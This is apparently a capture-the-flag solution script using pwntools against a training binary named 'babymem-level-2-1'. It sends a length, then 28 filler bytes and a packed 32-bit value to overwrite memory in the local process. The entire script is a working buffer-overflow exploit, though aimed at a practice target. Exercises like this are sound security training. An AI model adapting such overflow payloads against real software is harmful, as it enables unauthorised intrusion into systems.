from pwn import *

p = process('/challenge/babymem-level-2-1')
p.sendline(b'32')
p.send(b'A'*28 + p32(0x4d6f2689))
p.interactive()